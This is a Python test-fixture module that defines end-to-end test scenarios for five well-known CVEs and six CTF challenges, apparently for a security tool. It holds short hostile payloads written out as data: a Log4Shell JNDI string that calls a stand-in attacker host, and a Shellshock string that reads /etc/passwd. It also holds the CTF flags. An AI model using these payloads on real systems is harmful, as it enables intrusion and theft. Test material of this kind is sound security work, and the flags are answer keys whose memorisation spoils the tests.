"""Real CVE scenarios for E2E testing.

Each scenario represents a complete attack chain from reconnaissance
through exploitation, using real-world CVE data.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any


@dataclass(frozen=True)
class CVEScenario:
    """A real-world CVE scenario for testing."""
    name: str
    cve_id: str
    cvss: float
    target_software: str
    target_version: str
    vuln_type: str
    cwe_id: str
    description: str
    affected_ports: tuple[int, ...]
    attack_vector: str
    exploit_technique: str
    expected_access: str
    evidence_pattern: str
    mitre_technique: str


# ═══════════════════════════════════════════════════════════════════
#  1-Day CVE Scenarios
# ═══════════════════════════════════════════════════════════════════

LOG4SHELL = CVEScenario(
    name="Log4Shell",
    cve_id="CVE-2021-44228",
    cvss=10.0,
    target_software="Apache Log4j",
    target_version="2.14.1",
    vuln_type="Remote Code Execution",
    cwe_id="CWE-917",
    description=(
        "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases) "
        "JNDI features do not protect against attacker controlled LDAP and other "
        "JNDI related endpoints. An attacker who can control log messages or log "
        "message parameters can execute arbitrary code loaded from LDAP servers."
    ),
    affected_ports=(8080, 8443, 9200),
    attack_vector="${jndi:ldap://attacker.com/exploit}",
    exploit_technique="JNDI injection via HTTP header",
    expected_access="user",
    evidence_pattern="uid=\\d+\\(\\w+\\)",
    mitre_technique="T1190",  # Exploit Public-Facing Application
)

SPRING4SHELL = CVEScenario(
    name="Spring4Shell",
    cve_id="CVE-2022-22965",
    cvss=9.8,
    target_software="Spring Framework",
    target_version="5.3.17",
    vuln_type="Remote Code Execution",
    cwe_id="CWE-94",
    description=(
        "A Spring MVC or Spring WebFlux application running on JDK 9+ may be "
        "vulnerable to remote code execution (RCE) via data binding."
    ),
    affected_ports=(8080, 8443),
    attack_vector="class.module.classLoader.resources manipulation",
    exploit_technique="ClassLoader manipulation via data binding",
    expected_access="user",
    evidence_pattern="uid=\\d+\\(tomcat\\)",
    mitre_technique="T1190",
)

ETERNAL_BLUE = CVEScenario(
    name="EternalBlue",
    cve_id="CVE-2017-0144",
    cvss=9.3,
    target_software="Microsoft Windows SMBv1",
    target_version="Windows 7 / Server 2008 R2",
    vuln_type="Remote Code Execution",
    cwe_id="CWE-120",
    description=(
        "The SMBv1 server in Microsoft Windows allows remote attackers to "
        "execute arbitrary code via crafted packets."
    ),
    affected_ports=(445, 139),
    attack_vector="Crafted SMBv1 transaction request",
    exploit_technique="Buffer overflow in SMBv1 protocol handling",
    expected_access="system",
    evidence_pattern="NT AUTHORITY\\\\SYSTEM",
    mitre_technique="T1210",  # Exploitation of Remote Services
)

SHELLSHOCK = CVEScenario(
    name="Shellshock",
    cve_id="CVE-2014-6271",
    cvss=10.0,
    target_software="GNU Bash",
    target_version="4.3",
    vuln_type="Remote Code Execution",
    cwe_id="CWE-78",
    description=(
        "GNU Bash through 4.3 processes trailing strings after function "
        "definitions in the values of environment variables, which allows "
        "remote attackers to execute arbitrary code via a crafted environment."
    ),
    affected_ports=(80, 443, 8080),
    attack_vector="() { :; }; /bin/cat /etc/passwd",
    exploit_technique="Environment variable injection via CGI",
    expected_access="user",
    evidence_pattern="root:x:0:0:",
    mitre_technique="T1059.004",  # Unix Shell
)

PWNKIT = CVEScenario(
    name="PwnKit",
    cve_id="CVE-2021-4034",
    cvss=7.8,
    target_software="PolicyKit (pkexec)",
    target_version="0.105-31",
    vuln_type="Local Privilege Escalation",
    cwe_id="CWE-787",
    description=(
        "A local privilege escalation vulnerability in polkit's pkexec utility. "
        "The vulnerability enables an unprivileged local user to gain root access."
    ),
    affected_ports=(),
    attack_vector="pkexec --help (with crafted argc)",
    exploit_technique="Out-of-bounds write in pkexec argv handling",
    expected_access="root",
    evidence_pattern="uid=0\\(root\\)",
    mitre_technique="T1068",  # Exploitation for Privilege Escalation
)


ALL_CVE_SCENARIOS = [LOG4SHELL, SPRING4SHELL, ETERNAL_BLUE, SHELLSHOCK, PWNKIT]


# ═══════════════════════════════════════════════════════════════════
#  CTF Challenge Scenarios
# ═══════════════════════════════════════════════════════════════════


@dataclass(frozen=True)
class CTFScenario:
    """A CTF challenge scenario for testing."""
    name: str
    category: str
    points: int
    description: str
    flag: str
    approach: str
    techniques: tuple[str, ...]


BABY_SQLI = CTFScenario(
    name="Baby SQLi",
    category="web",
    points=100,
    description=(
        "A simple login form with SQL injection vulnerability. "
        "Find the admin password and get the flag."
    ),
    flag="flag{un10n_1nj3ct10n_b4by}",
    approach="Union-based SQL injection with information_schema enumeration",
    techniques=("UNION SELECT", "information_schema.tables", "information_schema.columns"),
)

XSS_PLAYGROUND = CTFScenario(
    name="XSS Playground",
    category="web",
    points=200,
    description="Bypass CSP and WAF to execute XSS and steal the admin cookie.",
    flag="flag{d0m_purify_byp4ss}",
    approach="DOM clobbering to bypass DOMPurify, then steal cookie via fetch",
    techniques=("DOM clobbering", "CSP bypass", "cookie exfiltration"),
)

BABY_PWN = CTFScenario(
    name="Baby Overflow",
    category="pwn",
    points=150,
    description="Classic buffer overflow with NX disabled. Overwrite return address to shellcode.",
    flag="flag{r3t2sh3llc0d3}",
    approach="Stack buffer overflow → NOP sled → shellcode",
    techniques=("buffer overflow", "NOP sled", "shellcode", "gdb"),
)

RSA_BABY = CTFScenario(
    name="RSA Baby",
    category="crypto",
    points=100,
    description="RSA with small public exponent e=3 and no padding. Recover plaintext.",
    flag="flag{sm4ll_e_n0_p4dd1ng}",
    approach="Cube root attack (e=3, m^3 < n, so m = ∛(c))",
    techniques=("cube root", "small exponent attack", "integer nth root"),
)

REVERSEME = CTFScenario(
    name="ReverseMe",
    category="reverse",
    points=200,
    description="Stripped ELF binary. Find the correct input that produces 'Correct!'.",
    flag="flag{str1ngs_4nd_gh1dr4}",
    approach="Static analysis with Ghidra + dynamic analysis with GDB",
    techniques=("Ghidra decompilation", "GDB breakpoints", "string analysis"),
)

STEGO_PNG = CTFScenario(
    name="Hidden Message",
    category="misc",
    points=100,
    description="A PNG image with a hidden message. Find the flag.",
    flag="flag{lsb_st3g0_3z}",
    approach="LSB steganography extraction from PNG",
    techniques=("zsteg", "LSB extraction", "binwalk"),
)


ALL_CTF_SCENARIOS = [BABY_SQLI, XSS_PLAYGROUND, BABY_PWN, RSA_BABY, REVERSEME, STEGO_PNG]
